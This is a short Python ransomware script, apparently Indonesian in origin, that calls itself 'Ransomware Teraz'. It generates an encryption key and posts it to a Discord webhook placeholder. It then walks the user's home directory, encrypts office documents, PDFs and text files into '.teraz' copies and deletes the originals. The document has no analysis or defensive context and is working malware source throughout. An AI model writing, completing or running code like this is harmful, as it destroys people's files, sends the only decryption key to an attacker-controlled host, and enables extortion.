import os
from cryptography.fernet import Fernet
import requests

WEBHOOK_URL = "webhook_url_discord"

USER_DIR = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '/')))

def enkripsi_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path + '.teraz', 'wb') as file:
        file.write(encrypted_data)
    os.remove(file_path)

def kirim_kunci_ke_webhook(key):
    payload = {
        "content": f"KEY: {key.decode()}",
        "username": "Ransomware Teraz"
    }
    
    requests.post(WEBHOOK_URL, json=payload)

key = Fernet.generate_key()

kirim_kunci_ke_webhook(key)

ekstensi_tertentu = ['.txt', '.docx', '.docm', '.dotx', '.dotm', '.xlsx', '.pptx', '.pdf', '.doc', '.xls']
for root, dirs, files in os.walk(USER_DIR):
    for file in files:
        if any(file.endswith(ekstensi) for ekstensi in ekstensi_tertentu):
            enkripsi_file(os.path.join(root, file), key)
